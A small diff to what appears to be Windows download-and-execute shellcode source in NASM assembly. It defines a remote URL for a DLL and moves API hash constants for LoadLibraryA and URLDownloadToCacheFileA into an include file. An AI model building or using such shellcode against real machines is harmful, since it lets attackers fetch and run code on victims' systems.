@@ -10,9 +10,7 @@ BITS 32
 %define url 'http://skypher.com/dll'
 %strlen sizeof_url url
 
-hash_ror_value                          equ 0x01
-hash_kernel32_LoadLibraryA              equ 0x1AAA
-hash_urlmon_URLDownloadToCacheFileA     equ 0x87F3
+%include 'w32-dl-loadlib-shellcode-hash-list.asm'
 
 %define B2W(b1,b2)                      (((b2) << 8) + (b1))
 %define W2DW(w1,w2)                     (((w2) << 16) + (w1))
